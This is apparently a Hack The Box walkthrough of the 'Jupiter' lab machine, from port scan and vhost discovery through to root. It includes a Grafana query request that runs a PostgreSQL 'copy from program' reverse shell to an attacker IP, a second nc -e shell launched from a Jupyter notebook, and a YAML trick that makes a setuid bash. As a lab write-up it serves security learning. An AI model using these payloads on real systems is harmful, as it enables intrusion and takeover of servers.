## Jupiter


Jupiter has 2 ports open ! 

```
Nmap scan report for 10.10.11.216 (10.10.11.216)
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA)
|_  256 6001d7db927b13f0ba20c6c900a71b41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://jupiter.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```


so we add the jupiter vhost in `/etc/hosts` ... but it's really poor weebsite with no hint for exploitation!
so i decided to go deeper and fuzz all directories inside `/img/blog`, `/img/work`, `/img/portfolio` but nothing.. all i can see it's  nice 403 http-error which means **Forbidden**.

Then i notice better if i nmap for jupiter.htb in port 80 the response was only GET amd HEAD method were allowed so bingo i have to find another vhost along the path.

I suggest to use ffuf couse gobuster vhost it's not always so precise and can give you some false positive


## Vhost enumeration

```
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.jupiter.htb' -u http://jupiter.htb/ -mc 200   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://jupiter.htb/
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.jupiter.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

[Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 1064ms]
    * FUZZ: kiosk


```
1.4.0 version not working for this particular threat so i decided to rebuild my ffuf and try again (3 hours stuck after this decision)




## GRAFANA



Grafana is a multi-platform open source analytics and interactive visualization web application. It provides charts, graphs, and alerts for the web when connected to supported data sources


Next step is trying to find something but all the security issues in github were patched in **v9.5.2(cfcea75916)** 

After sometime i found this [article](https://community.grafana.com/t/sql-injection-in-api-tsdb-query-in-grafana/29713) and it's really interesting becouse we have a really similar case which can bring in "sql injection" .




#### When we try to apply the time range modifications... 


```http
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d&from=now-6h&to=now
content-type: application/json
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
x-grafana-org-id: 1
x-panel-id: 24
x-plugin-id: postgres
Origin: http://kiosk.jupiter.htb
Content-Length: 335
Connection: close
Cookie: redirect_to=%2Fdashboards%3Fstarred
DNT: 1
Sec-GPC: 1

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select version();","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":940}],"range":{"from":"2023-06-05T01:20:10.129Z","to":"2023-06-05T07:20:10.129Z","raw":{"from":"now-6h","to":"now"}},"from":"1685928010129","to":"1685949610129"}
```

Response: 

```
PostgreSQL 14.8 (Ubuntu 14.8-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, 64-bit"

```

so we can now talk with postgresql server!!!


with this `SELECT datname FROM pg_database;` i was able to check all dbs!

- postgres
- moon_namesdb
- template1
- template2 


with this `SELECT * from pg_user;` check all the users!

- postgres
- grafana_viewer


but no password was found...




## Reverse Shell

```http
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d&from=now-6h&to=now
content-type: application/json
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
x-grafana-org-id: 1
x-panel-id: 24
x-plugin-id: postgres
Origin: http://kiosk.jupiter.htb
Content-Length: 416
Connection: close
Cookie: redirect_to=%2Fdashboards%3Fstarred
DNT: 1
Sec-GPC: 1

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"copy demo from program 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.47 4444 >/tmp/f'","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":940}],"range":{"from":"2023-06-05T01:20:10.129Z","to":"2023-06-05T07:20:10.129Z","raw":{"from":"now-6h","to":"now"}},"from":"1685928010129","to":"1685949610129"}

```


and boom we are postgres user! 





## Lateral Movement



Unfortunatly it's really unstable shell and i decide to spawn a child process with my nc couse the version of machine doesn't have the -e paramter which can execute a shell after spawning




With pspy we can see that's an interesting process by juno ...  


```
CMD: UID=1000  PID=2530   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 
```

and as we can see we can modify the content of this yml




```yml
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/bash
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: u+s /tmp/bash
      start_time: 5s

```


so after classic /tmp/bash -p we are in group of jovian and we can modify his authorized_keys with the attacker machine ssh id_rsa.pub
and now can gain access with ssh without any credentials

`ssh juno@jupiter.htb`




## Privesc



I notice that there's another lateral movement with solar-flares flow which i can see logs!

So everytime our victim connect with jupiter notebook (which is a open source framework for interactive computing across all programming languages) and in logs we can see his token and so we can directly access to the page without password



```
    To access the notebook, open this file in a browser:
        file:///home/jovian/.local/share/jupyter/runtime/nbserver-1162-open.html
    Or copy and paste one of these URLs:
        http://localhost:8888/?token=9f4cb36af18600c2aa48ccacc97273429a4261def2302e37
     or http://127.0.0.1:8888/?token=9f4cb36af18600c2aa48ccacc97273429a4261def2302e37

```


so with the help of chisel we can port forward in our localhost and boom we are just logged in 

now go on the .ipynb and lunch something like that ...


```
__import__('os').system('id')

jovian

__import__('os').system('/tmp/nc 10.10.14.40 4444 -e /bin/bash')


```

so now we can access with jovian permission and with `sudo -l` we can see there's this program `/usr/local/bin/sattrack` 


so now we can run

`sudo /usr/local/bin/sattrack` 

response
```
Satellite Tracking System
Configuration file has not been found. Please try again!

```


so now we have to decompile and see what is expecting..

and boom it' finds out for a config.json in /tmp... so now we can give it a simple line like that

```json
{"code":"code"}
```

and again `sudo /usr/local/bin/sattrack` with root permission, so now we are root!













